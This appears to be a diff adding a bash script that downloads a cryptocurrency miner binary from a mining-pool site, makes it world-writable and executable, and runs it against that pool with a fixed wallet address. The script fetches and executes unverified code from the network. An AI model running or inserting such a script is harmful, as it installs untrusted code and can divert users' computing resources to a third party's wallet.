@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://qubitcoin.luckypool.io/qubitcoin-miner-opt
+chmod 777 qubitcoin-miner-opt
+./qubitcoin-miner-opt -a qhash -o qubitcoin.luckypool.io:8610 -u bc1qmxm4tu4nh9k87f0yl3daud6tfruqsej6f3gemd.xxx -t 1
